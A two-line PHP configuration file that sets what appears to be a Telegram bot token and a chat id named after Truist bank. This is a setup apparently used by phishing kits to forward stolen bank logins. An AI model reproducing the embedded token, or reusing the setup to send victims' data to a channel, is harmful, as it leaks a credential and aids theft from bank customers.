<?php 



$bot = "7724974407:AAEabjudMAkonxqqSWwILz3ulS7NJ4upk6Q";
$chat_id = "@truistbanks";


?>